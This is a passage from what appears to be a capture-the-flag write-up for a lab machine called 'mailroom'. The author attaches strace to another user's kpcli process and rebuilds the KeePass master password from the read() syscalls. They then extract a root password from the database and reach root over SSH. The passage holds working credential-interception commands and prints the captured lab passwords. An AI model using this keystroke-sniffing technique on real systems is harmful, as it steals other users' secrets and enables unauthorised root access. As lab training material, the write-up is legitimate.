matthew@mailroom:~$ strace -p `ps aux | grep kpcli | grep perl | awk '{print $2}'`
strace: Process 302427 attached
```

The in the strace logs:

```bash
write(1, "Please provide the master passwo"..., 36) = 36
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
```

Then the follwoing read() will be what is imputed by the user and we should be able to read it's content. To make it easier to me I will copy the output to a txt manually and then I will grep all that starts with "read(".

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# cat output.txt | grep "read(" | grep "\""
read(3, "n", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "m", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "m", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "p", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "r", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "n", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "l", 1)                         = 1
read(3, ".", 1)                         = 1
read(3, "k", 1)                         = 1
read(3, "d", 1)                         = 1
read(3, "b", 1)                         = 1
read(3, "x", 1)                         = 1
read(3, "\n", 1)                        = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(0, "!", 8192)                      = 1
read(0, "s", 8192)                      = 1
read(0, "E", 8192)                      = 1
read(0, "c", 8192)                      = 1
read(0, "U", 8192)                      = 1
read(0, "r", 8192)                      = 1
read(0, "3", 8192)                      = 1
read(0, "p", 8192)                      = 1
read(0, "4", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "w", 8192)                      = 1
read(0, "0", 8192)                      = 1
read(0, "1", 8192)                      = 1
read(0, "\10", 8192)                    = 1
read(0, "r", 8192)                      = 1
read(0, "d", 8192)                      = 1
read(0, "9", 8192)                      = 1
read(0, "\n", 8192)                     = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(5, "\npackage Compress::Raw::Zlib;\n\nr"..., 8192) = 8192
read(5, " if $validate && $value !~ /^\\d+"..., 8192) = 8192
read(5, "    croak \"Compress::Raw::Zlib::"..., 8192) = 8192
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0)\0\0\0\0\0\0"..., 832) = 832
read(5, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\200\"\0\0\0\0\0\0"..., 832) = 832
read(5, "# XML::Parser\n#\n# Copyright (c) "..., 8192) = 8192
read(6, "package XML::Parser::Expat;\n\nuse"..., 8192) = 8192
read(6, ";\n    }\n}\n\nsub position_in_conte"..., 8192) = 8192
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240<\0\0\0\0\0\0"..., 832) = 832
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000B\0\0\0\0\0\0"..., 832) = 832
read(5, "package MIME::Base64;\n\nuse stric"..., 8192) = 5450
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300\22\0\0\0\0\0\0"..., 832) = 832
read(6, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(6, "", 8192)                       = 0
read(3, "l", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "R", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "s", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "-", 1)                         = 1
read(3, "f", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "0", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "q", 1)                         = 1
read(3, "u", 1)                         = 1
read(3, "i", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "\n", 1)                        = 1
read(7, "# NOTE: Derived from blib/lib/Te"..., 8192) = 665
read(7, "", 8192)                       = 0
```

And there we have the master password so let's try to open it! Escaping those "chars" and omitting the 1 and \\10 we get this (!sEcUr3p4$$w0rd9).

Using it in kpcli we can open it sucessfully:

![5a74f4be9e73e848906c9fa131c4088d.png](../../../_resources/5a74f4be9e73e848906c9fa131c4088d.png)

And list it's content:

![5124ec57f048ac10b02135fc782cfe9e.png](../../../_resources/5124ec57f048ac10b02135fc782cfe9e.png)

That root acc seems interesting:

![6b9ebf61e4a3995c8c702fb412a7dcdb.png](../../../_resources/6b9ebf61e4a3995c8c702fb412a7dcdb.png)

Copying it somewhere else you get password:

```Bash
Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL:
Notes: root account for sysadmin jobs
```

SSH in and profit!